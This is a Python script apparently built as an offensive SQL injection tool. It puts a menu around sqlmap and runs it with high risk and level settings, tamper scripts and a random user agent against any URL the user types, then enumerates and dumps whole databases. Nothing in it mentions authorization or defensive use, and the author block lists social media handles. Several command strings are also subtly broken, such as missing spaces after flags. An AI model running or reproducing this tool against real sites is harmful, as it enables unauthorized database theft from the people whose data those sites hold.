import os
import subprocess


def hphong_dpchai():
    print("""
            ▄█▀▀▀█▄█ ▄▄█▀▀██▄  ▀███▀▀▀██▄  ▄██    ▀███▀    ▀██▄
          ██   ▀██▄ ▀███▄   ██▀      ▀██  ██   ▄██    ▀█████▄█
          ██   ███████   ▄     ▀███▄      ▄██  ██        ██
          ██     ████▄    ▄██▀  ██        █▀█████▀  ▀▀████▀▀
          ▄████▄                    ███                              ▀████▀
             All choice here :
            1 : expoit target using sqlmap(slow but strong)
            2 : expoit target using sqlmap (fast but not strong)
            3 : install sqlmap
            4 : clear the screen
            5 : author information
            6 : dump database ( very slow but strong)
            7 : dump database (fast but not strong)
            
            
        """)

    command = input('hphong@SQP~: ')

    if command == '1':
        exploit_v2()
    elif command == '2':
         exploit()
    elif command == '3':
        hphong_install()
    elif command == '4':
        os.system(f'clear')
    elif command == '5':
       authordpchai()
    elif command == '6':
      hphong_dump()
    elif command == '7':
      hphong_dump_v2()


def hphong_install():
    print('DOWNLOADING SSQLMAP PLS WAIT A MIN')
    os.system('pip install sqlmap')
    hphong_dpchai()
def hphong_dump():
    target_url = input('TARGET : ')
    database = input('DBNAME : ')
    cmd = 'sqlmap -u' + target_url + ' --threads=10 --risk=3 --level=3 --tamper=space2plus -D' + database + ' --dump-all' + ' --batch'
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=None, shell=True)
    result = process.communicate()[0]
    print("dumped dbs : ", result.decode())
    hphong_dpchai()
    
def hphong_dump_v2():
    target_url = input('TARGET : ')
    database = input('DBNAME : ')
    cmd = 'sqlmap -u' + target_url + ' --threads=10 --tables --hex --tamper=space2plus -D' + database + ' --dump-all' + ' --batch'
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=None, shell=True)
    result = process.communicate()[0]
    print("dumped dbs : ", result.decode())
    hphong_dpchai()


def authordpchai():
    print("""
        Admin : hphongdev
        Telegram : @vilgaxinjector
        twitter : @vilgaxinjector

        ____________
        if you found any problem pls contact me
        dont encode my program if you dont want to be a skid
        """)

def exploit():
    target_url = input('TARGET : ')
    cmd = 'sqlmap -u ' + target_url + ' --dbs --threads=10 --hex --risk=3 --batch --random-agent'
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=None, shell=True)
    result = process.communicate()[0]
    print("Here is your result: ", result.decode())
    hphong_dpchai()
    
def exploit_v2():
    target_url = input('TARGET : ')
    cmd = 'sqlmap -u' + target_url + ' --threads=10 --risk=3 --level=3 --tamper=space2plus,space2comment --hex --tables'
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=None, shell=True)
    result = process.communicate()[0]
    print("dumped dbs : ", result.decode())
    hphong_dpchai()


if '_main_' == '_main_':
    hphong_dpchai()
